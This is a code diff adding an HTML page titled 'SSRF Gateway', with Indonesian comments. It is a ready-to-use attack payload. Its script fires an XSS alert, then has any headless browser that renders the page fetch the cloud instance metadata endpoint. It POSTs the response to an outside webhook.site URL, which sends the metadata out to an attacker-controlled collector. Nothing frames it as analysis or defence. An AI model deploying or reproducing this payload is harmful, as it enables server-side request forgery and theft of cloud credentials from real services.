@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>SSRF Gateway</title>
+    <script>
+      // Basic XSS Alert
+      alert("XSS berhasil");
+
+      // Auto SSRF Pingback (jika headless browser render script ini)
+      fetch("http://169.254.169.254/latest/meta-data/")
+        .then(res => res.text())
+        .then(data => {
+          fetch("https://webhook.site/5b40c85e-1775-48c1-96a3-156d01113c6c", {
+            method: "POST",
+            body: data
+          });
+        });
+    </script>
+  </head>
+  <body>
+    <h1>Payload Aktif</h1>
+  </body>
+</html>
